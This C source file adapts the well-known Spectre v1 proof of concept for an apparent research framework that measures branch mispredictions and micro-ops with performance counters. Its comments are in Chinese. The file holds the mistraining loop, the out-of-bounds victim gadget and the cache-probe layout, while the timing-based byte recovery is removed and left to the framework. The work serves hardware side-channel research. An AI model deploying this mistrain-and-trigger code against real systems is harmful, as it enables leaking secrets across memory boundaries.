/* ============================================================
 *  Spectre v1 PoC (Squeamish Ossifrage 经典版)
 *  — 适配三阶段验证框架版本
 *
 *  改造原则：最小侵入，尽量保留原 PoC 实现不变
 *
 *  改造点：
 *    [-] 删除 CACHE_HIT_THRESHOLD 宏
 *    [-] 删除 readMemoryByte() 函数（自实现 F+R 通道）
 *    [-] 删除 main 中按字节迭代解码循环
 *    [-] 删除 main 中装饰性 printf / sscanf_s 参数解析
 *    [-] 删除 MSVC getchar() 暂停
 *    [~] secret 改为单字节 "Y"
 *    [~] victim_function 加 noinline + PMU 插桩
 *    [~] training_x = tries % array1_size
 *         → training_x = j % array1_size（同语义替代）
 *    [+] probe_stride / NOP_REGION 宏 / 8 个 PMU extern
 *    [+] stage1_mistrain_trigger / 3 个 vf_ API
 *    [+] main 末尾输出 Stage1/Stage2 PMU 数据
 *
 *  保持原样：
 *    array2[256 * 512] 大小 / array2[array1[x] * 512] 硬编码 512
 *    / 数据布局 / 30 次循环 / 位运算选 x / 延迟循环 / clflush
 * ============================================================ */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/* sscanf_s only works in MSVC. sscanf should work with other compilers*/
#ifndef _MSC_VER
#define sscanf_s sscanf
#endif

/* ============================================================
 *  框架必需：瞬态区标记 + 探针步长
 *    probe_stride 值 = 512，与原 PoC 内 array2[array1[x] * 512] 一致
 * ============================================================ */
#define NOP_REGION_BEGIN  asm volatile("# NOP_REGION_BEGIN");
#define NOP_REGION_END    asm volatile("# NOP_REGION_END");

volatile size_t probe_stride = 512;

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

/* 单字节 secret —— 字符串字面量形式 */
char* secret = "Y";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

/********************************************************************
 * 框架 PMU 接口声明（实现由框架链接器提供）
 ********************************************************************/
extern int      pmu_stage1_get_count(void);
extern uint64_t pmu_stage1_get_delta(int i);
extern int      pmu_stage2_get_count(void);
extern uint64_t pmu_stage2_get_delta(int i);

extern void     pmu_uops_snap_before(void);
extern void     pmu_uops_snap_after(void);
extern void     pmu_uops_print_results(void);
extern int      pmu_uops_get_count(void);
extern int32_t  pmu_uops_get_transient(int i);

/********************************************************************
 * Victim Function (Gadget) —— 框架 PMU 插桩位置
 *
 *  保留原 victim_function 主体（包括 array2[array1[x] * 512]），
 *  仅在外围加入框架插桩标签：
 *    snap_before → STAGE1_BEGIN → 原分支判断
 *                              → NOP_REGION_BEGIN
 *                              → 原瞬态访问语句
 *                              → NOP_REGION_END
 *                              → STAGE1_END → snap_after
 ********************************************************************/
__attribute__((noinline))
void victim_function(size_t x)
{
	pmu_uops_snap_before();
	asm volatile(".globl STAGE1_BEGIN\nSTAGE1_BEGIN:");

	if (x < array1_size)
	{
		NOP_REGION_BEGIN
		temp &= array2[array1[x] * 512];
		NOP_REGION_END
	}

	asm volatile(".globl STAGE1_END\nSTAGE1_END:");
	pmu_uops_snap_after();
}

/********************************************************************
 * Mistrain + Trigger
 *
 *  抽离自原 readMemoryByte() 的内层 30 次循环。
 *  原代码中 training_x = tries % array1_size 依赖外层 tries 计数器，
 *  抽离后 tries 不再可用，采用同语义替代方案：
 *      用内层 j 替代 tries，使 training_x 仍逐轮变化（j=29..0），
 *      避免预测器学到固定地址特征。
 *  其余实现（clflush、延迟循环、位运算选 x、victim_function 调用）
 *  保持与原 PoC 完全一致。
 ********************************************************************/
__attribute__((noinline))
void stage1_mistrain_trigger(size_t malicious_x)
{
	int j;
	size_t training_x, x;

	/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
	for (j = 29; j >= 0; j--)
	{
		/* 同语义替代：原为 training_x = tries % array1_size，
		   此处用 j 替代 tries，保持训练索引逐轮变化的语义 */
		training_x = j % array1_size;

		_mm_clflush(&array1_size);
		for (volatile int z = 0; z < 100; z++)
		{
		} /* Delay (can also mfence) */

		/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
		/* Avoid jumps in case those tip off the branch predictor */
		x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
		x = training_x ^ (x & (malicious_x ^ training_x));

		/* Call the victim! */
		victim_function(x);
	}
}

/********************************************************************
 * 框架 API
 ********************************************************************/

/* [API-1] 给定 secret 字节值，返回 array2 中对应的探测地址
 *         框架 Stage3 用此函数枚举 256 个候选地址做 F+R */
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s)
{
	return &array2[(size_t)s * probe_stride];
}

/* [API-2] 预填 candidate_count 个候选探针缓存行
 *         目的：把 array2 所有候选行写脏，避免 COW 零页干扰 */
void vf_prepare_probe_region(int candidate_count)
{
	if (candidate_count <= 0 || candidate_count > 256)
		candidate_count = 256;
	for (int i = 0; i < candidate_count; i++)
	{
		volatile uint8_t *p = vf_get_probe_addr_for_secret((uint8_t)i);
		*p = 1;
	}
}

/* [API-3] 执行一次完整攻击（mistrain + trigger）
 *         框架在 Stage1/2/3 调用此函数触发瞬态执行 */
void vf_run_attack_once(void)
{
	size_t malicious_x = (size_t)(secret - (char *)array1);
	stage1_mistrain_trigger(malicious_x);
}

/********************************************************************
 * main —— 独立运行入口（框架插桩时可被替换）
 ********************************************************************/
#ifndef STAGE2_TEST_MAIN
int main(int argc, const char* * argv)
{
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */

	for (size_t i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

	if (argc == 3)
	{
		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
	}

	/* 执行一次完整攻击（mistrain + trigger） */
	stage1_mistrain_trigger(malicious_x);

	/* 输出 Stage1 BR_MISP 增量（供框架 Stage1 评分解析） */
	{
		int n = pmu_stage1_get_count();
		for (int i = 0; i < n; i++)
		{
			printf("STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n",
			       i, (unsigned long long)pmu_stage1_get_delta(i));
		}
	}

	/* 输出 Stage2 UOPS 测量结果（供框架 Stage2 评分解析） */
	pmu_uops_print_results();

	return (0);
}
#endif